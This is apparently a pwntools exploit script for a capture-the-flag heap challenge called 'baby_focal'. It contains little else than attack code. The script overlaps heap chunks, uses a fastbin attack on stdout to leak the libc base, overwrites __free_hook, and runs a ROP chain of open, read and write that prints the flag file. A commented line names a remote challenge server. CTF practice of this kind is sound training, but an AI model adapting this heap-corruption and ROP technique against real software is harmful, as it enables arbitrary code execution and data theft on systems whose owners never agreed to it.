#encoding:utf-8
from pwn import *
# context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']

def name(name):
    p.sendlineafter("name: ",name)
def add(id,size):
    p.sendlineafter(">> ",str(1))
    p.sendlineafter(">> ",str(id))
    p.sendlineafter(">> ",str(size))
def edit(id,content):
    p.sendlineafter(">> ",str(2))
    p.sendlineafter(">> ",str(id))
    p.sendafter(">> ",content)
def delete(id):
    p.sendlineafter(">> ",str(3))
    p.sendlineafter(">> ",str(id))
def free(id):
    p.sendlineafter(">> ",str(3))
    p.sendlineafter(">> ",str(id))

def exp():
    name("skye")
    '''
    for _ in range(8):
        add(0,0x68)
        delete(0)
    add(0,0x68)
    add(1,0x68)
    delete(1)
    edit(0,'a'*0x68+p64(0x71)+p64(0x404060))
    add(1,0x68)
    add(2,0x68)
    '''
    # fill tcache
    for i in range(7):
        add(0,0x68)
        free(0)
    for i in range(7):
        add(0,0x200)
        free(0)
    add(0,0x68)
    add(1,0x200)
    add(2,0x68)
    add(3,0x200)
    add(4,0x250)#protect
    #堆重叠
    delete(1)
    edit(0,'a'*0x68+p64(0x281)+'\n')#corrupted size vs. prev_size while consolidating
    edit(2,'a'*0x60+p64(0x280)+p64(0x210)+'\n')
    delete(3)
    delete(2)
    add(1,0x208)

    # _IO_2_1_stderr_ = libc.sym['_IO_2_1_stderr_']
    # log.info("_IO_2_1_stderr_:"+hex(_IO_2_1_stderr_))
    # _IO_2_1_stdout_ = libc.sym['_IO_2_1_stdout_']
    # log.info("_IO_2_1_stdout_:"+hex(_IO_2_1_stdout_))
    # target = _IO_2_1_stderr_+0xa0+5-8
    # log.info("target:"+hex(target))

    #fastbin attack
    #0x7ffff7fad65d
    edit(1,'b'*0x200+p64(0)+p64(0x71)+"\x5d\xd6"+'\n')
    add(2,0x68)
    add(3,0x68)
    edit(3,'a'*0x33+p64(0xfbad1887)+p64(0)*3+p8(0)+'\n')
    libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-(0x7ffff7fac980-0x7ffff7dc1000)
    log.info("libc_base:"+hex(libc_base))
    free_hook = libc_base + libc.sym['__free_hook']
    log.info("free_hook:"+hex(free_hook))

    # edit(2,p64(0x7ffff7facbe0)*2+'\n')
    edit(2,p64(libc_base + (0x7ffff7facbe0-0x7ffff7dc1000))*2+'\n')
    edit(1,'a'*0x208+p64(0x281)+'\n')
    delete(0)
    delete(4)
    add(4,0x68)
    add(0,0x68)
    delete(4)
    delete(0)
    edit(2,p64(0x404080)+'\n')
    add(4,0x68)
    add(0,0x68)
    edit(0,p64(0x404060)+p64(0x218)+'\n')
    edit(3,p64(free_hook)+p64(0x10)+p64(0x404080)+'\n')
    edit(0,p64(libc_base+libc.sym['puts'])+'\n')
    delete(1)
    p.recvuntil('\n')
    heap_addr = u64(p.recv(3).ljust(8,'\x00'))
    log.info("heap_addr:"+hex(heap_addr))

    libc_gadget = libc_base+0x0000000000157d8a
    pop_rdi_ret = libc_base+0x0000000000026b72
    pop_rsi_ret = libc_base+0x0000000000027529
    pop_rdx_r12_ret = libc_base+0x000000000011c371
    leave_ret = libc_base+0x000000000005aa48
    add_rsp_0x18_ret = libc_base+0x000000000003794a
    open_addr = libc_base+libc.sym['open']
    read_addr = libc_base+libc.sym['read']
    tcache_struct = heap_addr-0x6d0
    log.info("tcache_struct:"+hex(tcache_struct))

    edit(3,p64(free_hook)+p64(0x10)+p64(heap_addr-(0x40c6d0-0x40c240))+p64(0x200)+p64(heap_addr-(0x40c6d0-0x40c4b0))+p64(0x200)+'\n')
    edit(0,p64(libc_gadget)+'\n')

    # free chunk payload
    payload="./flag\x00\x00\x00".ljust(0x38+0x10,'a')
    payload += p64(heap_addr-(0x40c6d0-0x40c4b0)) #ropchunk
    payload += p64(leave_ret)
    edit(1,payload+'\n')

    # ropchain chunk payload 
    payload =p64(0xdeadbeefdeadbeef)+p64(add_rsp_0x18_ret)
    payload+=p64(0xdeadbeefdeadbeef)+p64(heap_addr-(0x40c6d0-0x40c240)+0x28)
    payload+=p64(0xdeadbeefdeadbeef)
    payload+=p64(pop_rdi_ret)+p64(heap_addr-(0x40c6d0-0x40c240))  #"flag" in chunk
    payload+=p64(pop_rsi_ret)+p64(0)
    payload+=p64(pop_rdx_r12_ret)+p64(0)*2
    payload+=p64(open_addr)

    payload+=p64(pop_rdi_ret)+p64(3)
    payload+=p64(pop_rsi_ret)
    payload+=p64(tcache_struct+0x400)
    payload+=p64(pop_rdx_r12_ret)+p64(0x50)+p64(0)
    payload+=p64(read_addr)

    # payload+=p64(pop_rdi_ret)
    # payload+=p64(tcache_struct+0x400)
    # payload+=p64(puts)
    payload+=p64(pop_rdi_ret)
    payload+=p64(1)
    payload+=p64(pop_rsi_ret)
    payload+=p64(tcache_struct+0x400)
    payload+=p64(libc_base+libc.sym['write'])
    edit(2,payload+'\n')

    # 0x7ffff7facbe0
    log.info("libc_gadget:"+hex(libc_gadget))
    # gdb.attach(p,"b *0x4018EF")
    # raw_input()

    delete(1)

    flag = p.recv()
    if("flag" in flag):
        print(flag) 
        sleep(1000000000);   

    p.interactive()

if __name__ == '__main__':
    p = process("./baby_focal")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    elf = ELF("./baby_focal")
    # p = process("./BabyNote")
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    # p = remote("8.134.14.168", 10000)
    # libc = ELF("./libc-2.31.so")
    while True:
        try:
            exp()
            exit(0)
        except:
            p.close()
            # p = remote("8.134.14.168", 10000)
            p = process("./baby_focal")
